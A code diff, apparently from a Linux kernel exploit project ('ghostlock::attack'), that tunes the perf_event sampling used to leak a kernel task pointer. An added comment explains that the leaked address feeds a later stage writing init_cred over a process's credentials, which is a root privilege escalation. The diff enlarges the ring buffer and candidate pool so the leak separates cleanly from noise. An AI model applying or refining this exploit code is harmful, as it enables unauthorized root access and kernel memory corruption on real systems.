@@ -447,7 +447,16 @@ namespace ghostlock::attack {
             return 0;
         }
         constexpr size_t kPerfPageSize = 4096;
-        constexpr size_t kPerfDataPages = 32;
+        /* Ring sizing matters far more than it looks. Each sample carries 32
+         * registers (~272 bytes with headers), so a 32-page ring retains only
+         * ~481 of the 500000 getpid calls requested below. ~99.9% of the
+         * samples are dropped and the vote is then taken over a candidate pool
+         * that never fills, which is why votes used to come out at 48-51/256
+         * with no separation between the real task pointer and noise. W2's
+         * write target is derived from this leak (child_task +
+         * TASK_CRED_OFF), so a wrong pick writes init_cred into unrelated
+         * kernel memory. 256 pages retain ~3800 samples. */
+        constexpr size_t kPerfDataPages = 256;
         constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
         const size_t msz = kPerfPageSize + kPerfDataSize;
         void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
@@ -466,7 +475,7 @@ namespace ghostlock::attack {
         std::atomic_thread_fence(std::memory_order_acquire);
         char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
         uint64_t pos = hdr->data_tail;
-        std::array<uintptr_t, 256> cands{};
+        std::array<uintptr_t, 8192> cands{};
         int32_t nc = 0;
         while (pos < head && nc < static_cast<int32_t>(cands.size())) {
             auto *ev = reinterpret_cast<struct perf_event_header *>(
